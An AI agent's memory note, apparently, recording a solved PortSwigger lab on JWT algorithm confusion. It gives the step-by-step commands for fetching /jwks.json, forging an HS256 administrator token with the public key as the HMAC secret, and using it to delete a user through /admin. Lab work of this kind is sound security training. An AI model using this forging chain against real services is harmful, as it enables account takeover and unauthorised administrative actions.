---
metadata:
  node_type: memory
name: "JWT Algorithm Confusion Lab Run"
description: "Solved lab-jwt-authentication-bypass-via-algorithm-confusion in 6 piece calls: jwks.json -> jwt pubkey PEM -> jwt forge HS256 sub=administrator -> /admin -> delete carlos -> solved banner"
last_updated: 2026-10-10T12:09:35+08:00
created: 2026-10-10T12:09:35+08:00
---

- Lab: /web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion (goal: read /admin, delete carlos). Instance 0a6500200353c49c806071e100bc0093, range_launch launch-url, reused:false.
- Chain (6 steps, all through pieces):
  1. page_read lab page -> widget-lab-id 9D708E56...E87A (page_read strips solution details; description only).
  2. http_session get /login --out /tmp/login.html -> hidden csrf field; http_dump /jwks.json --out /tmp/jwks.json -> RSA JWKS (kid 582c3352-..., n 1024-bit).
  3. http_session post /login --form csrf=... --form username=wiener --form password=peter --jar /tmp/cj1.json -> 302 /my-account?id=wiener + session JWT (header alg RS256 kid 582c3352-..., payload iss portswigger sub wiener). POST without csrf returns 400 {"Missing parameter 'csrf'"}.
  4. jwt pubkey /tmp/jwks.json --out /tmp/pub.pem -> SPKI PEM (451 bytes); jwt forge /tmp/jwks.json administrator --kid 582c3352-... --out /tmp/token.txt -> HS256 token whose HMAC key is the public-key PEM text.
  5. http_session get /admin --jar /tmp/cj_admin.json (hand-written jar {host:{session:<forged>}}) -> 200 admin panel; "My account" resolves to /my-account?id=administrator; delete links for wiener and carlos.
  6. http_session get /admin/delete?username=carlos --jar /tmp/cj_admin.json -> 302 /admin; banner_verdict base-url -> solved:true, "Congratulations, you solved the lab!".
- Mechanism: the server verifies with the RSA public key but honours the caller's alg header; switching alg to HS256 makes it HMAC-verify with the public-key bytes as the shared secret, so no private key is needed and the only prerequisite is the exposed /jwks.json.
- Crafting notes: keep kid so key lookup succeeds, exp far future is accepted; forged token is used directly as the session cookie value (no re-encoding).
- Piece fit: jwt (pubkey + forge) with http_session and banner_verdict covered the whole chain; no new piece needed. /jwks.json fit in one http_dump body_preview.

